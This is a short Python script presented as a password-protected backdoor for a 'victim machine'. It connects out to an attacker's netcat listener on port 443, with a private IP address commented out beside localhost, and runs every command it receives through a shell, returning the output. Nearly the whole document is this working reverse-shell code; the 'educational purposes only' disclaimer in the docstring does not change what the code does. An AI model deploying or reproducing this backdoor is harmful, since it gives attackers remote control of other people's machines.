# !/usr/bin/python

'''
This script is to be run on victim machine, 
it connects to a netcat listner on attacker machine
custom host and port can be set in the script.
This tool is for educational purposes only,
if you have any ideas or suggestions 
on how to improve on this please leave em in the comments
thanks
'''
import subprocess 
import socket

# host = '192.168.43.20'
host = 'localhost'

port = 443
passwd = 's3cr3t'

# check password
# we dont want others to be able to use our backdoor
def Login():
	global s
	s.send(b'Login: ')
	pwd = s.recv(1024)

	if pwd.strip() != passwd:
		Login()
	else:
		s.send('Connected #> ')
		Shell()

# execute shell commands
def Shell():
	while True:
		data = s.recv(1024)

		if data.strip() == 'kill':
			break
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# read function to read the standard output and errors
		output = proc.stdout.read() + proc.stderr.read() 
		# send back what happened to cammand typed
		s.send(output) 
		s.send('#> ')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
# print ('Password is '+passwd)

Login()
